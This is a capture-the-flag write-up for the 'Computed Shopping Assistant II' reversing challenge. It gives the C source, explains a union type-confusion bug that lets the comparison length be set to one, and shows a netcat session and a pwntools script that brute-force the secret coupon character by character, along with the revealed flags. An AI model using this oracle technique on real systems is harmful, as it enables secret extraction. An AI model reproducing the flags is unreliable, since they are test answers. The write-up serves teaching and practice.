# Computed Shopping Assistant II
Category: Reversing, 300 Points

## Description

> Welcome to Computed Shopping Assistant II
> 
> Sadly, some users found a way to abuse the system and use a secret coupon.
> 
> This time, we have added a new coupon that can't be revealed!
> 
> Note: the flag is in the format of CSA{...}

Three files were attached.

<details>
  <summary>View sources...</summary>

`shopping_cart.h`:

```c
#ifndef SHOPPING_CART_H
#define SHOPPING_CART_H

#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>

#define SHOPPING_CART_SIZE 100
#define STRING_BUFFER_SIZE 100
#define HIGH_DISCOUNT_AMOUNT 90


enum item_type {
	TYPE_UNDEFINED = 0,
	TYPE_BREAD     = 'b', // loaves
	TYPE_PASTA     = 'p', // kilograms
	TYPE_SOUP      = 's', // liters
	TYPE_DRINK     = 'd', // liters
	TYPE_VEGETABLE = 'v', // kilograms
	TYPE_FRUIT     = 'f', // items
	TYPE_COUPON    = 'c',
};

struct coupon_item {
	int discount_amount;
	int have_entered;
	int is_valid;
	int length;
	int expiration_day;
	int expiration_month;
	int expiration_year;
	char code[STRING_BUFFER_SIZE];
};

struct grocery_item {
	int amount_grams; // deprecated - use kilograms instead
	int amount_kilograms;
	int amount_items;
	int amount_loaves;
	int amount_liters;
	char description[STRING_BUFFER_SIZE];
};

struct shopping_cart_item {
	enum item_type type;
	union {
		struct coupon_item coupon;
		struct grocery_item grocery_item;
	};
};
typedef struct shopping_cart_item item;


struct shopping_cart {
	int amount_of_items;
	item items[SHOPPING_CART_SIZE];
};


item* add_item(enum item_type type);
void remove_item(int index);
bool can_edit_item(item* item);
bool is_valid_food_type(enum item_type type);
char* food_type_to_unit(enum item_type type);
void load_coupon(char* path, int discount);


#endif /* SHOPPING_CART_H */

```

`shopping_cart.c`:

```c
#include "shopping_cart.h"

struct shopping_cart shopping_cart;
char user_input[STRING_BUFFER_SIZE];
bool loaded_coupons;

int get_free_index() {
	for (int i = 0; i < SHOPPING_CART_SIZE; i++) {
		if (shopping_cart.items[i].type == TYPE_UNDEFINED) {
			return i;
		}
	}
	return -1;
}

item* add_item(enum item_type type) {
	int idx = get_free_index();
	if (idx == -1) {
		printf("Can't add more items to your shopping cart!\n");
		exit(0);
	}
	shopping_cart.items[idx].type = type;
	shopping_cart.amount_of_items++;
	return &shopping_cart.items[idx];
}

void remove_item(int index) {
	if (shopping_cart.items[index].type == TYPE_UNDEFINED) {
		printf("Item %d is not in your shopping cart!\n", index);
		return;
	}
	shopping_cart.items[index].type = TYPE_UNDEFINED;
	shopping_cart.amount_of_items--;
	printf("Item %d removed!\n", index);
}

bool can_edit_item(item* item){
	if ((item->type == TYPE_UNDEFINED)) {
		printf("There is no item at selected index\n");
		return false;
	} else if 
		(((item->type == TYPE_BREAD) && (item->grocery_item.amount_loaves > 0)) || ((item->type == TYPE_PASTA) && (item->grocery_item.amount_kilograms > 0)) ||
		((item->type == TYPE_SOUP) && (item->grocery_item.amount_liters > 0)) || ((item->type == TYPE_DRINK) && (item->grocery_item.amount_liters > 0)) ||
		((item->type == TYPE_VEGETABLE) && (item->grocery_item.amount_kilograms > 0)) || ((item->type = TYPE_FRUIT) && (item->grocery_item.amount_items > 0))) {
		return true;
	} else if ((item->type = TYPE_COUPON)) {
		printf("Item is a coupon!\n");
		return false;
	} else {
		printf("Invalid item type!\n");
		return false;
	}
}

bool is_valid_food_type(enum item_type type) {
	return (
		(type == TYPE_BREAD)     || 
		(type == TYPE_PASTA)     || 
		(type == TYPE_SOUP)      || 
		(type == TYPE_DRINK)     || 
		(type == TYPE_VEGETABLE) || 
		(type == TYPE_FRUIT));
}

char* food_type_to_unit(enum item_type type) {
	switch (type) {
		case TYPE_BREAD:
			return "loaves";
			break;
		case TYPE_PASTA:
		case TYPE_VEGETABLE:
			return "kilogram(s)";
			break;
		case TYPE_SOUP:
		case TYPE_DRINK:
			return "liter(s)";
			break;
		case TYPE_FRUIT:
			return "unit(s)";
			break;
	}
}

bool is_coupon_valid(char* coupon) {
	// black list of expired coupons
	if (!memcmp(coupon, "NOT_A_FLAG{I_L0V3_CSA}", strlen(coupon)) ||
		!memcmp(coupon, "NOT_A_FLAG{G1V3_M3_M0R3_C0UP0N5_PL3453}", strlen(coupon)) ||
		!memcmp(coupon, "NOT_A_FLAG{TH3_C4K3_1S_A_L1E}", strlen(coupon))) {
		return false;
	} else {
		return true;
	}
}

void load_coupon(char* path, int discount) {
	char coupon[STRING_BUFFER_SIZE];

	FILE *fp = fopen(path, "r");
	if (fp == NULL) {
		printf("Unable to open file! (%s)\n", path);
		exit(0);
	}

	if (fgets(coupon, STRING_BUFFER_SIZE, fp) == NULL) {
		printf("Could not load coupon %s!\n", path);
		exit(0);
	}
	fclose(fp);

	int is_valid = is_coupon_valid(coupon);
	if (!is_valid) {
		return;
	}

	item* item = add_item(TYPE_COUPON);
	item->coupon.discount_amount = discount;
	item->coupon.have_entered = false;
	item->coupon.is_valid = is_valid;
	item->coupon.length = strlen(coupon);
	item->coupon.expiration_day = 0;  // todo - implement expiration date check
	item->coupon.expiration_month = 0;
	item->coupon.expiration_year = 0;
	strncpy(item->coupon.code, coupon, strlen(coupon));
}

```

`main.c`:

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdbool.h>
#include "shopping_cart.h"

extern struct shopping_cart shopping_cart;
extern char user_input[];
extern bool loaded_coupons;

void add_item_menu() {
	printf("Which item would you like to add?\n");
	printf("%c - Bread\n", TYPE_BREAD);
	printf("%c - Pasta\n", TYPE_PASTA);
	printf("%c - Soup\n", TYPE_SOUP);
	printf("%c - Drink\n", TYPE_DRINK);
	printf("%c - Vegetable\n", TYPE_VEGETABLE);
	printf("%c - Fruit\n", TYPE_FRUIT);

	char choice_type;
	scanf(" %c", &choice_type);

	if (!is_valid_food_type(choice_type)) {
		printf("Invalid type entered!\n");
		return;
	}

	item* item = add_item(choice_type);

	switch (choice_type) {
		case TYPE_BREAD:
			strcpy(item->grocery_item.description, "White bread");
			item->grocery_item.amount_loaves = 1;
			break;
		case TYPE_PASTA:
			strcpy(item->grocery_item.description, "Spaghetti");
			item->grocery_item.amount_kilograms = 1;
			break;
		case TYPE_SOUP:
			strcpy(item->grocery_item.description, "Lentil soup");
			item->grocery_item.amount_liters = 1;
			break;
		case TYPE_DRINK:
			strcpy(item->grocery_item.description, "Coca-Cola");
			item->grocery_item.amount_liters = 1;
			break;
		case TYPE_VEGETABLE:
			strcpy(item->grocery_item.description, "Potatoes");
			item->grocery_item.amount_kilograms = 1;
			break;
		case TYPE_FRUIT:
			strcpy(item->grocery_item.description, "Apples");
			item->grocery_item.amount_items = 1;
			break;
	}
	printf("1 %s of %s added!\n", food_type_to_unit(choice_type), item->grocery_item.description);
}

void edit_item_menu() {
	if (shopping_cart.amount_of_items == 0) {
		printf("Your shopping cart is empty!\n");
		return;
	}
	printf("Which item index would you like to edit?\n");

	int choice;
	scanf("%d", &choice);
	if (choice < 0 || choice >= SHOPPING_CART_SIZE) {
		printf("Invalid item index!\n");
		return;
	}
	item* item = &shopping_cart.items[choice];

	if (!can_edit_item(item)) {
		printf("Can not edit this item!\n");
		return;
	}

	printf("Which property would you like to edit?\n"
		"1 - Type\n"
		"2 - Amount of kilograms\n"
		"3 - Amount of items\n"
		"4 - Amount of loaves\n"
		"5 - Amount of liters\n"
		"6 - Description\n"
		"7 - Cancel\n");
	scanf("%d", &choice);

	if (choice < 1 || choice > 7) {
		printf("Invalid choice!\n");
		return;
	}

	char newline;
	scanf("%c", &newline); // clear newline from buffer
	char choice_type;

	switch (choice) {
		case 1:
			printf("Enter new type: ");
			fflush(stdout);
			scanf(" %c", &choice_type);
			if (choice_type == TYPE_COUPON) {
				printf("You can not convert to coupon!\n");
			} else if (is_valid_food_type(choice_type)) {
				item->type = choice_type;
			} else {
				printf("Invalid type entered!\n");
			}
			break;
		case 2:
			printf("Enter new kilograms amount: ");
			fflush(stdout);
			scanf("%d", &choice);
			item->grocery_item.amount_kilograms = choice;
			break;
		case 3:
			printf("Enter new items amount: ");
			fflush(stdout);
			scanf("%d", &choice);
			item->grocery_item.amount_items = choice;
			break;
		case 4:
			printf("Enter new loaves amount: ");
			fflush(stdout);
			scanf("%d", &choice);
			item->grocery_item.amount_loaves = choice;
			break;
		case 5:
			printf("Enter new liters amount: ");
			fflush(stdout);
			scanf("%d", &choice);
			item->grocery_item.amount_liters = choice;
			break;
		case 6:
			printf("Enter new description: ");
			fflush(stdout);
			fgets(item->grocery_item.description, STRING_BUFFER_SIZE, stdin);
			item->grocery_item.description[strlen(item->grocery_item.description)-1] = '\0'; // remove newline
			break;
		case 7:
			return;
			break;
	}
	printf("Item updated!\n");
}

void remove_item_menu() {
	if (shopping_cart.amount_of_items == 0) {
		printf("Your shopping cart is empty!\n");
		return;
	}
	printf("Which item index would you like to remove?\n");

	int choice;
	scanf("%d", &choice);
	if (choice < 0 || choice >= SHOPPING_CART_SIZE) {
		printf("Invalid item index!\n");
		return;
	}
	remove_item(choice);
}

void print_shopping_cart() {
	if (shopping_cart.amount_of_items == 0) {
		printf("\nYour shopping cart is empty!\n");
		return;
	}
	printf("\nYour shopping cart has %d items:\n", shopping_cart.amount_of_items);
	for (int i = 0; i < SHOPPING_CART_SIZE; i++) {
		item* item = &shopping_cart.items[i];

		int amount = 0;
		switch (item->type) {
			case TYPE_UNDEFINED:
				break;
			case TYPE_COUPON:
				if (item->coupon.have_entered) {
					if (item->coupon.discount_amount < HIGH_DISCOUNT_AMOUNT) {
						printf("(index %d) - %d%% OFF coupon - %s\n", i, item->coupon.discount_amount, item->coupon.code);
					} else { // need to be a little more discrete about special coupons
						printf("(index %d) - %d%% OFF coupon - *CENSORED*\n", i, item->coupon.discount_amount);
					}
				}
				break;
			default:
				switch (item->type) {
					case TYPE_BREAD:
						amount = item->grocery_item.amount_loaves;
						break;
					case TYPE_PASTA:
					case TYPE_VEGETABLE:
						amount = item->grocery_item.amount_kilograms;
						break;
					case TYPE_SOUP:
					case TYPE_DRINK:
						amount = item->grocery_item.amount_liters;
						break;
					case TYPE_FRUIT:
						amount = item->grocery_item.amount_items;
				}
				printf("(index %d) - %d %s of %s\n", i, amount, food_type_to_unit(item->type), item->grocery_item.description);
				break;
		}
	}
}

void apply_a_coupon() {
	if (!loaded_coupons) {
		load_coupon("coupon_10.txt", 10);
		load_coupon("coupon_50.txt", 50);
		load_coupon("coupon_100.txt", 100);
		loaded_coupons = true;
	}
	printf("Please enter your coupon:\n");
	char newline;
	scanf("%c", &newline); // clear newline from buffer
	fgets(user_input, STRING_BUFFER_SIZE, stdin);
	
	for (int i = 0; i < SHOPPING_CART_SIZE; i++) {
		item* item = &shopping_cart.items[i];
		if (item->type == TYPE_COUPON && !item->coupon.have_entered) {
			if (!memcmp(item->coupon.code, user_input, item->coupon.length)) {
				printf("Applied coupon for %d%% OFF!\n", item->coupon.discount_amount);
				item->coupon.have_entered = true;
				return;
			}
		}
	}
	printf("Invalid coupon!\n");
}

void checkout() {
	printf("\nThank you for choosing Computed Shopping Assistant II !\n");
	printf("Your items will be delivered to you within 24 hours.\n");
	printf("Goodbye!\n");
	exit(0);
}

void main_menu() {
	printf("\n---> Welcome to Computed Shopping Assistant II <---\n");

	while (true) {
		printf("\nWhat would you like to do?\n"
				"1 - Add item to shopping cart\n"
				"2 - Edit item in shopping cart\n"
				"3 - Remove item from shopping cart\n"
				"4 - View shopping cart\n"
				"5 - Apply a coupon\n"
				"6 - Checkout\n");

		int choice = 0;
		scanf("%d", &choice);

		switch (choice) {
			case 1:
				add_item_menu();
				break;
			case 2:
				edit_item_menu();
				break;
			case 3:
				remove_item_menu();
				break;
			case 4:
				print_shopping_cart();
				break;
			case 5:
				apply_a_coupon();
				break;
			case 6:
				checkout();
				break;
			default:
				printf("Invalid choice!\n");
				exit(0);
				break;
		}
	}
}

int main() {
	memset(&shopping_cart, 0, sizeof(shopping_cart));
	main_menu();
}
```

</details>


## Solution

This is the follow-up for [Computed Shopping Assistant](Computed_Shopping_Assistant.md). Since we have the sources for the previous challenge as well, it's interesting to check the delta between them:

```console
┌──(user@kali)-[/media/sf_CTFs/checkpoint/Computed_Shopping_Assistant_II]
└─$ diff Computed_Shopping_Assistant_II/shopping_cart.h ../Computed_Shopping_Assistant/Computed_Shopping_Assistant/shopping_cart.h
11d10
< #define HIGH_DISCOUNT_AMOUNT 90

┌──(user@kali)-[/media/sf_CTFs/checkpoint/Computed_Shopping_Assistant_II]
└─$ diff Computed_Shopping_Assistant_II/shopping_cart.c ../Computed_Shopping_Assistant/Computed_Shopping_Assistant/shopping_cart.c

┌──(user@kali)-[/media/sf_CTFs/checkpoint/Computed_Shopping_Assistant_II]
└─$ diff Computed_Shopping_Assistant_II/main.c ../Computed_Shopping_Assistant/Computed_Shopping_Assistant/main.c
179,183c179
<                                       if (item->coupon.discount_amount < HIGH_DISCOUNT_AMOUNT) {
<                                               printf("(index %d) - %d%% OFF coupon - %s\n", i, item->coupon.discount_amount, item->coupon.code);
<                                       } else { // need to be a little more discrete about special coupons
<                                               printf("(index %d) - %d%% OFF coupon - *CENSORED*\n", i, item->coupon.discount_amount);
<                                       }
---
>                                       printf("(index %d) - %d%% OFF coupon - %s\n", i, item->coupon.discount_amount, item->coupon.code);
212d207
<               load_coupon("coupon_100.txt", 100);
234c229
<       printf("\nThank you for choosing Computed Shopping Assistant II !\n");
---
>       printf("\nThank you for choosing Computed Shopping Assistant!\n");
241c236
<       printf("\n---> Welcome to Computed Shopping Assistant II <---\n");
---
>       printf("\n---> Welcome to Computed Shopping Assistant <---\n");
```

So the main security enhancement is here:

```c
			case TYPE_COUPON:
				if (item->coupon.have_entered) {
					if (item->coupon.discount_amount < HIGH_DISCOUNT_AMOUNT) {
						printf("(index %d) - %d%% OFF coupon - %s\n", i, item->coupon.discount_amount, item->coupon.code);
					} else { // need to be a little more discrete about special coupons
						printf("(index %d) - %d%% OFF coupon - *CENSORED*\n", i, item->coupon.discount_amount);
					}
				}
```

The program will only print the coupon if it's one of the cheaper coupons, and we already know those:

```console
┌──(user@kali)-[/media/sf_CTFs/checkpoint/Computed_Shopping_Assistant_II]
└─$  nc csa-2.csa-challenge.com 2222

---> Welcome to Computed Shopping Assistant II <---

What would you like to do?
1 - Add item to shopping cart
2 - Edit item in shopping cart
3 - Remove item from shopping cart
4 - View shopping cart
5 - Apply a coupon
6 - Checkout
5
Please enter your coupon:
NOT_A_FLAG{I_4M_A_N3WB1E}
Applied coupon for 10% OFF!

What would you like to do?
1 - Add item to shopping cart
2 - Edit item in shopping cart
3 - Remove item from shopping cart
4 - View shopping cart
5 - Apply a coupon
6 - Checkout
5
Please enter your coupon:
CSA{iN_L1nuX_1T_W0UlDnT_H4PP3N}
Applied coupon for 50% OFF!

What would you like to do?
1 - Add item to shopping cart
2 - Edit item in shopping cart
3 - Remove item from shopping cart
4 - View shopping cart
5 - Apply a coupon
6 - Checkout
6

Thank you for choosing Computed Shopping Assistant II !
Your items will be delivered to you within 24 hours.
Goodbye!
```

So how do we leak the coupon this time? It would have been nice to modify the `discount_amount` using the same "type confusion" technique we've used in the previous challenge, but `amount_grams` is deprecated and can't be modified. 

```
        coupon_item                        grocery_item
+---------------------------+   +---------------------------------+
| discount_amount           |   | amount_grams                    |
+---------------------------+   +---------------------------------+
| have_entered              |   | amount_kilograms                |
+---------------------------+   +---------------------------------+
| is_valid                  |   | amount_items                    |
+---------------------------+   +---------------------------------+
| length                    |   | amount_loaves                   |
+---------------------------+   +---------------------------------+
| expiration_day            |   | amount_liters                   |
+---------------------------+   +---------------------------------+
| expiration_month          |   | description[STRING_BUFFER_SIZE] |
+---------------------------+   |                                 |
| expiration_year           |   |                                 |
+---------------------------+   |                                 |
| code[STRING_BUFFER_SIZE]  |   +---------------------------------+
|                           |
|                           |
+---------------------------+   
```

Cross referencing the fields we *can* change using type confusion with the implementation, we notice that the `length` field seems quite promising. Here's where it's used:

```c
void apply_a_coupon() {
	if (!loaded_coupons) {
		load_coupon("coupon_10.txt", 10);
		load_coupon("coupon_50.txt", 50);
		load_coupon("coupon_100.txt", 100);
		loaded_coupons = true;
	}
	printf("Please enter your coupon:\n");
	char newline;
	scanf("%c", &newline); // clear newline from buffer
	fgets(user_input, STRING_BUFFER_SIZE, stdin);
	
	for (int i = 0; i < SHOPPING_CART_SIZE; i++) {
		item* item = &shopping_cart.items[i];
		if (item->type == TYPE_COUPON && !item->coupon.have_entered) {
			if (!memcmp(item->coupon.code, user_input, item->coupon.length)) {
				printf("Applied coupon for %d%% OFF!\n", item->coupon.discount_amount);
				item->coupon.have_entered = true;
				return;
			}
		}
	}
	printf("Invalid coupon!\n");
}
```

To apply a coupon, the program compares the user input to the loaded coupon up to the `length` of the coupon. What will happen if we modify the `length` (a.k.a. `amount_loaves`) of the secret coupon to `1`? Well, in that case, in order for our coupon to be accepted by the program, we just need to provide an input where the first character of the coupon matches the first character of the input. So, to know what's the first character of the coupon, we just need to input all printable characters, one at a time, and see for which one the coupon is accepted. Once we have that, we proceed in the same manner to reveal the second character, and so on.

Here's an example:

```console
┌──(user@kali)-[/media/sf_CTFs/checkpoint/Computed_Shopping_Assistant_II]
└─$  nc csa-2.csa-challenge.com 2222

---> Welcome to Computed Shopping Assistant II <---

What would you like to do?
1 - Add item to shopping cart
2 - Edit item in shopping cart
3 - Remove item from shopping cart
4 - View shopping cart
5 - Apply a coupon
6 - Checkout
5
Please enter your coupon:
NOT_A_FLAG{I_4M_A_N3WB1E}
Applied coupon for 10% OFF!

What would you like to do?
1 - Add item to shopping cart
2 - Edit item in shopping cart
3 - Remove item from shopping cart
4 - View shopping cart
5 - Apply a coupon
6 - Checkout
2
Which item index would you like to edit?
2
Which property would you like to edit?
1 - Type
2 - Amount of kilograms
3 - Amount of items
4 - Amount of loaves
5 - Amount of liters
6 - Description
7 - Cancel
4
Enter new loaves amount: 1
Item updated!

What would you like to do?
1 - Add item to shopping cart
2 - Edit item in shopping cart
3 - Remove item from shopping cart
4 - View shopping cart
5 - Apply a coupon
6 - Checkout
2
Which item index would you like to edit?
2
Which property would you like to edit?
1 - Type
2 - Amount of kilograms
3 - Amount of items
4 - Amount of loaves
5 - Amount of liters
6 - Description
7 - Cancel
3
Enter new items amount: 0
Item updated!

What would you like to do?
1 - Add item to shopping cart
2 - Edit item in shopping cart
3 - Remove item from shopping cart
4 - View shopping cart
5 - Apply a coupon
6 - Checkout
2
Which item index would you like to edit?
2
Item is a coupon!
Can not edit this item!

What would you like to do?
1 - Add item to shopping cart
2 - Edit item in shopping cart
3 - Remove item from shopping cart
4 - View shopping cart
5 - Apply a coupon
6 - Checkout
5
Please enter your coupon:
C
Applied coupon for 100% OFF!

What would you like to do?
1 - Add item to shopping cart
2 - Edit item in shopping cart
3 - Remove item from shopping cart
4 - View shopping cart
5 - Apply a coupon
6 - Checkout
6

Thank you for choosing Computed Shopping Assistant II !
Your items will be delivered to you within 24 hours.
Goodbye!
```

First, we apply a coupon in order to load into memory the other coupons. The coupon we want to leak is at index `2`. Then, we change the amount of loaves (a.k.a. the length) to `1` (note that this also converts the coupon to a fruit as we saw in the previous challenge). We change the amount of items to `0` in order to allow converting back to a coupon (based on the bug from the previous challenge). Finally, we try to apply the coupon `C`, which gets accepted (since the coupon starts with `CSA{`).

Now we automate the process:

```python
# First, generate a pwntools template using:
#  pwn template --host csa.csa-challenge.com --port 2222
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

from enum import Enum
from typing import Union
import string

# Printable characters (excluding {'\r', '\x0c', '\t', '\x0b', '\n'}), order optimized for CTF flags
ALPHABET = 'Ee3Tt7Aa@4Oo0Ii1!_NnSs5$HhRrDdLlCcUuMmWwFfGg6YyPpBbVvKkJjXxQqZz289{}"#%&\'()*+,-./:;<=>?[\\]^`|~ '
assert(set(ALPHABET) == set(string.ascii_lowercase + string.ascii_uppercase + string.digits + string.punctuation + ' '))

class ComputedShoppingAssistant():

    class MenuOption(Enum):
        ADD_ITEM        = 1
        EDIT_ITEM       = 2
        REMOVE_ITEM     = 3
        VIEW_CART       = 4
        APPLY_COUPON    = 5
        CHECKOUT        = 6

    class ItemProperty(Enum):
        TYPE            = 1
        KILOGRAMS       = 2
        ITEMS           = 3
        LOAVES          = 4
        LITERS          = 5
        DESCRIPTION     = 6
        INVALID         = 7

    def __init__(self, io: pwnlib.tubes.tube):
        self.io = io

    def _select_menu(self, selection: "ComputedShoppingAssistant.MenuOption") -> None:
        self.io.recvuntilS(b"What would you like to do?\r\n")
        for _ in self.MenuOption:
            self.io.recvline()
        self.io.sendline(str(selection.value).encode("ascii"))

    def apply_coupon(self, coupon: str) -> bool:
        self._select_menu(self.MenuOption.APPLY_COUPON)
        self.io.sendlineafter(b"Please enter your coupon:\r\n", coupon.encode("ascii"))
        result = self.io.recvlineS()
        return result != "Invalid coupon!\r\n"

    def edit_item(self, index: int, property: "ComputedShoppingAssistant.ItemProperty", value: Union[int, str, None]) -> bool:
        self._select_menu(self.MenuOption.EDIT_ITEM)
        self.io.sendlineafter(b"Which item index would you like to edit?\r\n", str(index).encode("ascii"))
        out = self.io.recvlineS()
        if out == "Item is a coupon!\r\n":
            return False
        assert(out == "Which property would you like to edit?\r\n")
        for _ in self.ItemProperty:
            self.io.recvline()
        self.io.sendline(str(property.value).encode("ascii"))
        self.io.sendlineafter(b": ", str(value).encode("ascii"))
        out = self.io.recvlineS()
        return out == "Item updated!\r\n"

    def view_cart(self) -> str:
        self._select_menu(self.MenuOption.VIEW_CART)
        self.io.recvuntil(b'\r\nYour shopping cart has')
        self.io.recvline()
        out = self.io.recvuntilS("\r\n\r\n".encode("ascii"))
        return out.strip().split("\r\n")

    def checkout(self) -> None:
        self._select_menu(self.MenuOption.CHECKOUT)

coupon_index = 2

flag = ""

with log.progress('Brute forcing flag...') as p:
    while True:
        with context.local(log_level='ERROR'): 
            io = start()

        csa = ComputedShoppingAssistant(io)

        csa.apply_coupon("NOT_A_FLAG{I_4M_A_N3WB1E}")
        csa.apply_coupon("CSA{iN_L1nuX_1T_W0UlDnT_H4PP3N}")

        # Will change coupon to fruit and set amount_loaves (i.e. length) to n
        csa.edit_item(coupon_index, ComputedShoppingAssistant.ItemProperty.LOAVES, len(flag) + 1)

        # Will set amount_items to 0
        csa.edit_item(coupon_index, ComputedShoppingAssistant.ItemProperty.ITEMS, 0)

        # Will change fruit to coupon
        csa.edit_item(coupon_index, ComputedShoppingAssistant.ItemProperty.ITEMS, None)

        for c in ALPHABET:
            p.status(f"Known flag: '{flag}', trying '{c}'")
            if csa.apply_coupon(flag + c):
                flag += c
                with context.local(log_level='ERROR'): 
                    io.close()
                break
        else:
            raise RuntimeError("Can't find flag")

        if flag[-1] == "}":
            break

log.info(f"Flag: {flag}")
```

Output:

```console
┌──(user@kali)-[/media/sf_CTFs/checkpoint/Computed_Shopping_Assistant_II]
└─$ python3 exploit.py
[+] Brute forcing flag...: Done
[*] Flag: CSA{Typ3_C0nFu510n_iS_a_ReAL_Pr0bL3m}
```